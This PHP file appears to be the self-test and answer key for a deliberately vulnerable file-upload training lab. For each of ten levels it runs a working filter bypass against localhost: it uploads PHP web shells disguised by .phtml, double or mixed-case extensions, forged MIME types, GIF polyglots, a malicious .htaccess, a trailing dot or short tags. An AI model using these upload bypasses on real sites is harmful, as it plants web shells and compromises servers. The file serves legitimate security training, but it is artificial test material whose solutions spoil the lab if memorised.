<?php
/**
 * File Upload Lab self-test: performs the intended bypass for every level as a
 * real multipart upload, then requests the stored file back so the check proves
 * genuine code execution - not just that the filter was satisfied.
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * Every file it creates under uploads/ is removed again at the end.
 */
require_once __DIR__ . '/helpers.php';

$base    = 'http://localhost';
$pass    = 0;
$fail    = 0;
$created = [];   // [level, stored filename] pairs to clean up

/** Real multipart/form-data upload, exactly as a browser or curl would send it. */
function upload(string $url, string $name, string $content, string $mime): string
{
    $b    = '----uploadcheck' . bin2hex(random_bytes(8));
    $body = "--$b\r\nContent-Disposition: form-data; name=\"file\"; filename=\"$name\"\r\n"
          . "Content-Type: $mime\r\n\r\n$content\r\n--$b--\r\n";
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: multipart/form-data; boundary=$b\r\n",
        'content' => $body,
        'timeout' => 20,
        'ignore_errors' => true,
    ]]);
    return (string) @file_get_contents($url, false, $ctx);
}

function fetch(string $url): string
{
    $ctx = stream_context_create(['http' => ['timeout' => 10, 'ignore_errors' => true]]);
    return (string) @file_get_contents($url, false, $ctx);
}

/**
 * Solve one level: upload the payload, require the page to award the flag AND
 * the stored file to return the flag when requested over HTTP.
 */
function solve(int $level, string $name, string $content, string $mime = 'application/octet-stream', string $note = ''): void
{
    global $base, $pass, $fail, $created;

    $want = get_flag_for_level($level);
    $page = upload("$base/level$level.php", $name, $content, $mime);
    $created[] = [$level, $name];

    $served = fetch("$base/uploads/level$level/" . rawurlencode($name));

    $awarded  = $want !== '' && strpos($page, $want) !== false;
    $executed = strpos($served, $want) !== false;

    if ($awarded && $executed) {
        $pass++;
        printf("  PASS  level %-2d %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
        return;
    }
    $fail++;
    printf("  FAIL  level %-2d expected %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    printf("        page awarded flag: %s | stored file executed: %s\n",
        $awarded ? 'yes' : 'NO', $executed ? 'yes' : 'NO');
}

echo "File Upload Lab self-test\n-------------------------\n";

/* 1 - nothing is validated, so a plain .php web shell lands and runs */
solve(1, 'shell.php', "<?php readfile('/var/secret/level1_flag.txt');", 'application/octet-stream',
    'plain .php web shell');

/* 2 - the blocklist only holds "php"; Apache runs .phtml too */
solve(2, 'shell.phtml', "<?php readfile('/var/secret/level2_flag.txt');", 'application/octet-stream',
    '.phtml is not on the list');

/* 3 - the Content-Type is client-supplied, so claim image/png */
solve(3, 'shell.php', "<?php readfile('/var/secret/level3_flag.txt');", 'image/png',
    'forged MIME header');

/* 4 - polyglot: image signature first, PHP after it */
solve(4, 'shell.php', "GIF89a;<?php readfile('/var/secret/level4_flag.txt');", 'application/octet-stream',
    'GIF89a magic-byte polyglot');

/* 5 - the allowlist reads the LAST extension, mod_mime reads any of them */
solve(5, 'shell.php.jpg', "<?php readfile('/var/secret/level5_flag.txt');", 'image/jpeg',
    'double extension');

/* 6 - the blocklist compare is case sensitive, the filesystem is not */
solve(6, 'shell.PhP', "<?php readfile('/var/secret/level6_flag.txt');", 'application/octet-stream',
    'mixed-case extension');

/* 7 - two steps: a .htaccess that remaps .jpg, then the .jpg shell it enables */
$ht = "<FilesMatch \"\.jpg$\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n";
$htPage    = upload("$base/level7.php", '.htaccess', $ht, 'text/plain');
$created[] = [7, '.htaccess'];
$shellPage = upload("$base/level7.php", 'shell.jpg', "<?php readfile('/var/secret/level7_flag.txt');", 'image/jpeg');
$created[] = [7, 'shell.jpg'];
$served7   = fetch("$base/uploads/level7/shell.jpg");
$want7     = get_flag_for_level(7);
if (strpos($htPage, $want7) !== false && strpos($served7, $want7) !== false) {
    $pass++;
    printf("  PASS  level %-2d %s  (%s)\n", 7, $want7, '.htaccess remaps .jpg, shell.jpg then executes');
} else {
    $fail++;
    printf("  FAIL  level %-2d expected %s  (.htaccess remap)\n", 7, $want7);
    printf("        page awarded flag: %s | shell.jpg executed: %s\n",
        strpos($htPage, $want7) !== false ? 'yes' : 'NO',
        strpos($served7, $want7) !== false ? 'yes' : 'NO');
}

/* 8 - pathinfo() loses the extension on a trailing dot; Apache does not */
solve(8, 'shell.php.', "<?php readfile('/var/secret/level8_flag.txt');", 'application/octet-stream',
    'trailing dot defeats pathinfo()');

/* 9 - the content scan only knows about <?php, so open with <?= */
solve(9, 'shell.php', "<?= readfile('/var/secret/level9_flag.txt');", 'application/octet-stream',
    'short-echo tag');

/* 10 - one payload beats all four layers at once */
solve(10, 'shell.php.jpg', "GIF89a;<?= readfile('/var/secret/level10_flag.txt');", 'image/png',
    'double ext + MIME + magic + <?=');

/* ── Clean up every file this run created ───────────────────── */
$removed = 0;
foreach ($created as [$lvl, $fname]) {
    $path = upload_base_dir() . '/level' . $lvl . '/' . sanitize_store_name($fname);
    if (is_file($path) && @unlink($path)) $removed++;
}
echo "-------------------------\ncleaned up $removed uploaded file(s)\n";

echo "$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
